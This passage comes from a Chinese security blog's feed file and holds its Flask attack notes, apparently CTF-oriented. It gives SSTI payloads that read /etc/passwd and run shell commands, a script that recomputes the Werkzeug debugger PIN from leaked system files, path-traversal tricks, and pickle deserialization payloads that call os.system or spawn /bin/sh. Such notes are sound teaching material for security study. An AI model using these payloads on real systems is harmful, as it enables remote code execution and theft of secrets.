+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">80</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">80</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">80</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;open&#x27;</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<h5 id="request-1"><code>request</code></h5>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;request.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">open</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;</span><br><span class="line">&#123;&#123;request.application.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">open</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<h5 id="url_for"><code>url_for</code></h5>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>].config&#125;&#125;</span><br><span class="line">&#123;&#123;url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
+<h5 id="get_flashed_messages"><code>get_flashed_messages</code></h5>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;get_flashed_messages.__globals__[<span class="string">&#x27;current_app&#x27;</span>].config&#125;&#125;</span><br><span class="line">&#123;&#123;get_flashed_messages.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
+<h5 id="lipsum"><code>lipsum</code></h5>
+<p><code>lipsum</code> 是 Flask 用来测试用的函数，其中
+<code>lipsum.__globals__</code> 自带 <code>os</code> 模块。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;lipsum.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br><span class="line">&#123;&#123;lipsum.__globals__.os.popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br><span class="line">&#123;&#123;lipsum.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="fix">fix</h2>
+<h3 id="终极式">终极式</h3>
+<p><strong>没有模板就没有注入</strong>，只要我们把模板代码去掉即可。</p>
+]]></content>
+      <tags>
+        <tag>flask</tag>
+        <tag>ssti</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>flask攻击相关笔记</title>
+    <url>//flask-note.html</url>
+    <content><![CDATA[<h1 id="flask">Flask</h1>
+<h2 id="ssti">SSTI</h2>
+<p>Flask
+SSTI，即模板注入，旨在利用相关模板引擎的特点，通过沙箱逃逸等技术进行攻击服务，获取隐私信息。</p>
+<p><a href="/flask-ssti-note.html">点击这里</a>。</p>
+<h2 id="pin-码计算">PIN 码计算</h2>
+<h3 id="简介">简介</h3>
+<p>PIN是 Werkzeug（它是 Flask
+的依赖项之一）提供的额外安全措施，以防止在不知道 PIN
+的情况下访问调试器。</p>
+<p>调试器 PIN
+只是一个附加的安全层，以防您无意中在生产应用程序中打开调试模式，从而使攻击者难以访问调试器。</p>
+<p>Werkzeug 不同版本以及 Python 不同版本都会影响 PIN 码的生成。</p>
+<p>但是 PIN 码并不是随机生成，当我们重复运行同一程序时，生成的 PIN
+一样，PIN 码生成满足一定的生成算法。</p>
+<h3 id="源码分析">源码分析</h3>
+<p>Werkzeug 生成 PIN 码的核心代码如下</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_pin_and_cookie_name</span>(<span class="params"></span></span><br><span class="line"><span class="params">    app: <span class="string">&quot;WSGIApplication&quot;</span>,</span></span><br><span class="line"><span class="params"></span>) -&gt; t.<span class="type">Union</span>[t.<span class="type">Tuple</span>[<span class="built_in">str</span>, <span class="built_in">str</span>], t.<span class="type">Tuple</span>[<span class="literal">None</span>, <span class="literal">None</span>]]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Given an application object this returns a semi-stable 9 digit pin</span></span><br><span class="line"><span class="string">    code and a random key.  The hope is that this is stable between</span></span><br><span class="line"><span class="string">    restarts to not make debugging particularly frustrating.  If the pin</span></span><br><span class="line"><span class="string">    was forcefully disabled this returns `None`.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Second item in the resulting tuple is the cookie name for remembering.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    pin = os.environ.get(<span class="string">&quot;WERKZEUG_DEBUG_PIN&quot;</span>)</span><br><span class="line">    rv = <span class="literal">None</span></span><br><span class="line">    num = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Pin was explicitly disabled</span></span><br><span class="line">    <span class="keyword">if</span> pin == <span class="string">&quot;off&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Pin was provided explicitly</span></span><br><span class="line">    <span class="keyword">if</span> pin <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> pin.replace(<span class="string">&quot;-&quot;</span>, <span class="string">&quot;&quot;</span>).isdecimal():</span><br><span class="line">        <span class="comment"># If there are separators in the pin, return it directly</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;-&quot;</span> <span class="keyword">in</span> pin:</span><br><span class="line">            rv = pin</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            num = pin</span><br><span class="line"></span><br><span class="line">    modname = <span class="built_in">getattr</span>(app, <span class="string">&quot;__module__&quot;</span>, t.cast(<span class="built_in">object</span>, app).__class__.__module__)</span><br><span class="line">    username: t.<span class="type">Optional</span>[<span class="built_in">str</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># getuser imports the pwd module, which does not exist in Google</span></span><br><span class="line">        <span class="comment"># App Engine. It may also raise a KeyError if the UID does not</span></span><br><span class="line">        <span class="comment"># have a username, such as in Docker.</span></span><br><span class="line">        username = getpass.getuser()</span><br><span class="line">    <span class="keyword">except</span> (ImportError, KeyError):</span><br><span class="line">        username = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    mod = sys.modules.get(modname)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># This information only exists to make the cookie unique on the</span></span><br><span class="line">    <span class="comment"># computer, not as a security feature.</span></span><br><span class="line">    probably_public_bits = [</span><br><span class="line">        username,</span><br><span class="line">        modname,</span><br><span class="line">        <span class="built_in">getattr</span>(app, <span class="string">&quot;__name__&quot;</span>, <span class="built_in">type</span>(app).__name__),</span><br><span class="line">        <span class="built_in">getattr</span>(mod, <span class="string">&quot;__file__&quot;</span>, <span class="literal">None</span>),</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># This information is here to make it harder for an attacker to</span></span><br><span class="line">    <span class="comment"># guess the cookie name.  They are unlikely to be contained anywhere</span></span><br><span class="line">    <span class="comment"># within the unauthenticated debug page.</span></span><br><span class="line">    private_bits = [<span class="built_in">str</span>(uuid.getnode()), get_machine_id()]</span><br><span class="line"></span><br><span class="line">    h = hashlib.sha1()</span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">            bit = bit.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        h.update(bit)</span><br><span class="line">    h.update(<span class="string">b&quot;cookiesalt&quot;</span>)</span><br><span class="line"></span><br><span class="line">    cookie_name = <span class="string">f&quot;__wzd<span class="subst">&#123;h.hexdigest()[:<span class="number">20</span>]&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># If we need to generate a pin we salt it a bit more so that we don&#x27;t</span></span><br><span class="line">    <span class="comment"># end up with the same value and generate out 9 digits</span></span><br><span class="line">    <span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        h.update(<span class="string">b&quot;pinsalt&quot;</span>)</span><br><span class="line">        num = <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>):09d&#125;</span>&quot;</span>[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Format the pincode in groups of digits for easier remembering if</span></span><br><span class="line">    <span class="comment"># we don&#x27;t have a result yet.</span></span><br><span class="line">    <span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">                rv = <span class="string">&quot;-&quot;</span>.join(</span><br><span class="line">                    num[x : x + group_size].rjust(group_size, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">                    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size)</span><br><span class="line">                )</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            rv = num</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> rv, cookie_name</span><br></pre></td></tr></table></figure>
+<p>其中 <code>rv</code> 为 PIN 码值。</p>
+<p>从代码中分析得知，PIN 码的组成由以下几部分组成：</p>
+<ul>
+<li><code>username</code>：通过 <code>getpass.getuser()</code>
+获取，是启动 Flask 的用户</li>
+<li><code>modname</code>：模块名，一般默认为 <code>flask.app</code></li>
+<li><code>appname</code>：通过
+<code>getattr(app, "__name__", type(app).__name__)</code> 获取，app
+名，一般默认为 <code>Flask</code></li>
+<li><code>moddir</code>：模块路径，flask目录下的一个 <code>app.py</code>
+的绝对路径</li>
+<li><code>mac</code>：通过 <code>str(uuid.getnode())</code>
+获取，当前网络的 MAC 地址的十进制数</li>
+<li><code>machine_id</code>：通过 <code>get_machine_id()</code>
+获取，<code>/etc/machine-id</code> 或者
+<code>/proc/sys/kernel/random/boot_i</code> 中的值</li>
+</ul>
+<h3 id="信息获取">信息获取</h3>
+<h4 id="username">username</h4>
+<p>一般通过读取 <code>/etc/passwd</code>
+文件寻找可能的用户进行爆破。</p>
+<h4 id="modname">modname</h4>
+<p>默认 <code>flask.app</code>。</p>
+<h4 id="appname">appname</h4>
+<p>默认为 <code>Flask</code>。</p>
+<h4 id="moddir">moddir</h4>
+<p>可以通过 DEBUG 模式下的报错信息获取。</p>
+<h4 id="mac">mac</h4>
+<p>读取 <code>/sys/class/net/eth0/address</code> 获取 MAC 的 16
+进制，然后转化为十进制即可。</p>
+<blockquote>
+<p>不一定是 <code>eth0</code>，可能需要尝试爆破。</p>
+</blockquote>
+<h4 id="machine_id">machine_id</h4>
+<p>在 Linux 平台下，为 <code>/etc/machine-id</code> 或者
+<code>/proc/sys/kernel/random/boot_i</code> 中的值</p>
+<p>在 Win 平台下，为注册表中
+<code>SOFTWARE\Microsoft\Cryptography</code> 的值。</p>
+<p>在 Docker 中，为 <code>/proc/self/cgroup</code> 的
+<code>docker</code> 行后的十六进制字符串，例如
+<code>1:name=systemd:/docker/4e2d4390ee2a9b57df253521f44301973efc74e35a300a02b4e509d60989543b</code>
+中的
+<code>4e2d4390ee2a9b57df253521f44301973efc74e35a300a02b4e509d60989543b</code>。</p>
+<h3 id="计算代码">计算代码</h3>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"></span><br><span class="line">username = <span class="string">&#x27;flaskweb&#x27;</span></span><br><span class="line">modname = <span class="string">&#x27;flask.app&#x27;</span></span><br><span class="line">appname = <span class="string">&#x27;Flask&#x27;</span></span><br><span class="line">moddir = <span class="string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span></span><br><span class="line">mac = <span class="string">&#x27;2485410340366&#x27;</span></span><br><span class="line">machine_id = <span class="string">&#x27;e7589bcf11d8b1f072f28454074a932798a86f05827bdbd7707b3c14f75e756c&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_pin_and_cookie_name</span>(<span class="params">username: <span class="built_in">str</span>, modname: <span class="built_in">str</span>, appname:<span class="built_in">str</span> , moddir:<span class="built_in">str</span> , mac: <span class="built_in">str</span>, machine_id: <span class="built_in">str</span>, high_version: <span class="built_in">bool</span>=<span class="literal">False</span></span>):</span><br><span class="line">    probably_public_bits = [username, modname, appname, moddir]</span><br><span class="line">    private_bits = [mac, machine_id]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> high_version:</span><br><span class="line">        h = hashlib.sha1()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        h = hashlib.md5()</span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">            bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        h.update(bit)</span><br><span class="line">    h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line">    cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line">    num = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">        num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line">    rv = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">                rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                            <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            rv = num</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> rv, cookie_name</span><br><span class="line"></span><br><span class="line">PIN, cookie_name = get_pin_and_cookie_name(username, modname, appname, moddir, mac, machine_id)</span><br><span class="line"><span class="built_in">print</span>(PIN)</span><br></pre></td></tr></table></figure>
+<p>在 Python 不同版本中，&lt;=3.7 <code>h</code> 采用 md5 算法；&gt;3.7
+<code>h</code> 采用 sha1 算法。在以上代码可以给予值
+<code>high_version=True</code> 采用 sha1 算法。</p>
+<h2 id="session-构造">session 构造</h2>
+<p>Flask 中的 session 是通过 secret_key 进行签名的，所以在构造 session
+之前需要获取 secret_key。</p>
+<p>可以使用脚本 <a href="https://github.com/noraj/flask-session-cookie-manager">flask-session-cookie-manager</a>
+加密解密 session 的 jwt。</p>
+<p>也可以试图自己运行代码获取伪造 session 值。</p>
+<h2 id="一些巧妙利用">一些巧妙利用</h2>
+<h3 id="secret_key">SECRET_KEY</h3>
+<p>SECRET_KEY 会被存放在环境变量和 <code>config</code> 中，可以考虑读取
+<code>/proc/self/environ</code> 或者使用 <code>env</code> 命令。</p>
+<p>其他的获取方式可以查看 SSTI 的文章内容。</p>
+<h3 id="os.path.join"><code>os.path.join()</code></h3>
+<p><code>os.path.join()</code>
+函数用于拼接两个字符串作为路径，分隔符以系统指定分隔符为主。</p>
+<p>但当两个目录为同级目录时，只会默认返回后一个字符串作为结果，例如
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">os.path.join(<span class="string">&#x27;static&#x27;</span>, <span class="string">&#x27;/abc/cba&#x27;</span>)</span><br></pre></td></tr></table></figure></p>
+<p>需要注意，第二个目录需要是根目录才能被识别为同级目录。</p>
+<p>还有一种利用是目录穿越，但需要注意的是 Python 的目录穿越只有
+<code>../../</code> 的方式。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># filename = &#x27;../../flag&#x27;</span></span><br><span class="line">os.path.join(<span class="string">&#x27;/temp/pic&#x27;</span>, filename)</span><br></pre></td></tr></table></figure>
+<h3 id="pickle-反序列化注入">pickle 反序列化注入</h3>
+<h4 id="基本原理">基本原理</h4>
+<p>Python 的 <code>__reduce__</code> 魔术方法正是 Python
+类的反序列化方法，我们可以通过注入命令到 <code>__reduce__</code>
+方法中。</p>
+<p>Python 要求 <code>__reduce__</code>
+方法返回一个函数和需要调用的参数（<code>(callable, [para1, para2, ...])</code>），Python
+希望的是通过 callable
+和其参数生成该对象，但实际上我们可以利用这点变相调用漏洞函数。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        a = <span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (os.system, (a, ))</span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line">payload = pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"><span class="comment"># pickle.loads(payload)</span></span><br></pre></td></tr></table></figure>
+<p>当运行 <code>pickle.loads(payload)</code> 时，我们将进入 sh。</p>
+<h4 id="opcode">opcode</h4>
+<p>pickle 的 opcode 详解如下</p>
+<table>
+<colgroup>
+<col style="width: 3%">
+<col style="width: 31%">
+<col style="width: 26%">
+<col style="width: 31%">
+<col style="width: 6%">
+</colgroup>
+<thead>
+<tr class="header">
+<th>opcode</th>
+<th>描述</th>
+<th>具体写法</th>
+<th>栈上的变化</th>
+<th>memo上的变化</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>c</td>
+<td>获取一个全局对象或import一个模块（注：会调用import语句，能够引入新的包）</td>
+<td>c[module]</td>
+<td>获得的对象入栈</td>
+<td>无</td>
+</tr>
+<tr class="even">
+<td>o</td>
+<td>寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）</td>
+<td>o</td>
+<td>这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈</td>
+<td>无</td>
+</tr>
+<tr class="odd">
+<td>i</td>
+<td>相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</td>
+<td>i[module]</td>
+<td>这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈</td>
+<td>无</td>
+</tr>
+<tr class="even">
+<td>N</td>
+<td>实例化一个None</td>
+<td>N</td>
+<td>获得的对象入栈</td>
+<td>无</td>
+</tr>
+<tr class="odd">
+<td>S</td>
+<td>实例化一个字符串对象</td>
+<td>S'xxx'（也可以使用双引号、'等python字符串形式）</td>
+<td>获得的对象入栈</td>
+<td>无</td>
+</tr>
+<tr class="even">
+<td>V</td>
+<td>实例化一个UNICODE字符串对象</td>
+<td>Vxxx</td>
+<td>获得的对象入栈</td>
+<td>无</td>
+</tr>
+<tr class="odd">
+<td>I</td>
+<td>实例化一个int对象</td>
+<td>Ixxx</td>
+<td>获得的对象入栈</td>
+<td>无</td>
+</tr>
+<tr class="even">
+<td>F</td>
+<td>实例化一个float对象</td>
+<td>Fx.x</td>
+<td>获得的对象入栈</td>
+<td>无</td>
+</tr>
+<tr class="odd">
+<td>R</td>
+<td>选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数</td>
+<td>R</td>
+<td>函数和参数出栈，函数的返回值入栈</td>
+<td>无</td>
+</tr>
+<tr class="even">
+<td>.</td>
+<td>程序结束，栈顶的一个元素作为pickle.loads()的返回值</td>
+<td>.</td>
+<td>无</td>
+<td>无</td>
+</tr>
+<tr class="odd">
+<td>(</td>
+<td>向栈中压入一个MARK标记</td>
+<td>(</td>
+<td>MARK标记入栈</td>
+<td>无</td>
+</tr>
+<tr class="even">
+<td>t</td>
+<td>寻找栈中的上一个MARK，并组合之间的数据为元组</td>
+<td>t</td>
+<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
+<td>无</td>
+</tr>
+<tr class="odd">
+<td>)</td>
+<td>向栈中直接压入一个空元组</td>
+<td>)</td>
+<td>空元组入栈</td>
+<td>无</td>
+</tr>
+<tr class="even">
+<td>l</td>
+<td>寻找栈中的上一个MARK，并组合之间的数据为列表</td>
+<td>l</td>
+<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
+<td>无</td>
+</tr>
+<tr class="odd">
+<td>]</td>
+<td>向栈中直接压入一个空列表</td>
+<td>]</td>
+<td>空列表入栈</td>
+<td>无</td>
+</tr>
+<tr class="even">
+<td>d</td>
+<td>寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对）</td>
+<td>d</td>
+<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
+<td>无</td>
+</tr>
+<tr class="odd">
+<td>}</td>
+<td>向栈中直接压入一个空字典</td>
+<td>}</td>
+<td>空字典入栈</td>
+<td>无</td>
+</tr>
+<tr class="even">
+<td>p</td>
+<td>将栈顶对象储存至memo_n</td>
+<td>pn</td>
+<td>无</td>
+<td>对象被储存</td>
+</tr>
+<tr class="odd">
+<td>g</td>
+<td>将memo_n的对象压栈</td>
+<td>gn</td>
+<td>对象被压栈</td>
+<td>无</td>
+</tr>
+<tr class="even">
+<td>0</td>
+<td>丢弃栈顶对象</td>
+<td>0</td>
+<td>栈顶对象被丢弃</td>
+<td>无</td>
+</tr>
+<tr class="odd">
+<td>b</td>
+<td>使用栈中的第一个元素（储存多个属性名:
+属性值的字典）对第二个元素（对象实例）进行属性设置</td>
+<td>b</td>
+<td>栈上第一个元素出栈</td>
+<td>无</td>
+</tr>
+<tr class="even">
+<td>s</td>
+<td>将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中</td>
+<td>s</td>
+<td>第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新</td>
+<td>无</td>
+</tr>
+<tr class="odd">
+<td>u</td>
+<td>寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中</td>
+<td>u</td>
+<td>MARK标记以及被组合的数据出栈，字典被更新</td>
+<td>无</td>
+</tr>
+<tr class="even">
+<td>a</td>
+<td>将栈的第一个元素append到第二个元素(列表)中</td>
+<td>a</td>
+<td>栈顶元素出栈，第二个元素（列表）被更新</td>
+<td>无</td>
+</tr>
+<tr class="odd">
+<td>e</td>
+<td>寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中</td>
+<td>e</td>
+<td>MARK标记以及被组合的数据出栈，列表被更新</td>
+<td>无</td>
+</tr>
+</tbody>
+</table>
+<p>此外， <code>TRUE</code> 可以用 <code>I</code> 表示：
+<code>b'I01\n'</code> ； <code>FALSE</code> 也可以用 <code>I</code>
+表示： <code>b'I00\n'</code> ，其他 opcode 可以在<a href="https://github.com/python/cpython/blob/master/Lib/pickle.py#L111">pickle库的源代码</a>中找到。
+由这些opcode我们可以得到一些需要注意的地方：</p>
+<ul>
+<li>编写opcode时要想象栈中的数据，以正确使用每种opcode。</li>
+<li>在理解时注意与python本身的操作对照（比如python列表的<code>append</code>对应<code>a</code>、<code>extend</code>对应<code>e</code>；字典的<code>update</code>对应<code>u</code>）。</li>
+<li><code>c</code>操作符会尝试<code>import</code>库，所以在<code>pickle.loads</code>时不需要漏洞代码中先引入系统库。</li>
+<li>pickle不支持列表索引、字典索引、点号取对象属性作为<strong>左值</strong>，需要索引时只能先获取相应的函数（如<code>getattr</code>、<code>dict.get</code>）才能进行。但是因为存在<code>s</code>、<code>u</code>、<code>b</code>操作符，<strong>作为右值是可以的</strong>。即“查值不行，赋值可以”。pickle能够索引查值的操作只有<code>c</code>、<code>i</code>。而如何查值也是CTF的一个重要考点。</li>
+<li><code>s</code>、<code>u</code>、<code>b</code>操作符可以构造并赋值原来没有的属性、键值对。</li>
+</ul>
+<p>使用 <code>pickletools</code> 的 <code>dis</code>
+函数可以展示更易识别的序列化后的内容。</p>
+<p>利用 opcode 我们可以更精细化地做事情。</p>
+<h4 id="拼接-opcode">拼接 opcode</h4>
+<p>仅需把第一个 pickle 流结尾表示结束的 <code>.</code>
+去掉后直接拼接第二个 pickle 流即可。</p>
+<h4 id="全局变量覆盖">全局变量覆盖</h4>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> secret</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">opcode = <span class="string">b&#x27;&#x27;&#x27;c__main__</span></span><br><span class="line"><span class="string">secret</span></span><br><span class="line"><span class="string">(S&#x27;name&#x27;</span></span><br><span class="line"><span class="string">S&#x27;qsdz&#x27;</span></span><br><span class="line"><span class="string">db.&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;[before] <span class="subst">&#123;secret.name = &#125;</span>&#x27;</span>)</span><br><span class="line">output = pickle.loads(opcode)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;output = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;[after] <span class="subst">&#123;secret.name = &#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>opcode 解析：</p>
+<ol type="1">
+<li><code>c__main__\nsecret\n</code>，读取 <code>__main__</code> 中的
+<code>secret</code> 模块</li>
+<li><code>(</code>，标记一个 MARK</li>
+<li><code>S'name'\n</code>，生成字符串 <code>'name'</code>
+入栈（并是标记位）</li>
+<li><code>S'qsdz'\n</code>，生成字符串 <code>'qsdz'</code> 入栈</li>
+<li><code>d</code>，将栈-2和栈-1位置的值按 <code>key-value</code>
+对组成字典，然后入栈字典</li>
+<li><code>b</code>，将 <code>key-value</code> 对以
+<code>key=value</code> 的形式赋值属性</li>
+<li><code>.</code>，结束反序列化</li>
+</ol>
+<h4 id="函数执行">函数执行</h4>
+<p>能进行函数执行的 opcode
+有三个，<code>R</code>、<code>i</code>、<code>o</code>，所以有三种方向构造</p>
+<h5 id="r">R</h5>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">b&#x27;&#x27;&#x27;cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">(S&#x27;whoami&#x27;</span></span><br><span class="line"><span class="string">tR.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
+<h5 id="i">i</h5>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">b&#x27;&#x27;&#x27;(S&#x27;whoami&#x27;</span></span><br><span class="line"><span class="string">ios</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
+<h5 id="o">o</h5>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">b&#x27;&#x27;&#x27;(cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">S&#x27;whoami&#x27;</span></span><br><span class="line"><span class="string">o.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
+<h4 id="实例化对象">实例化对象</h4>
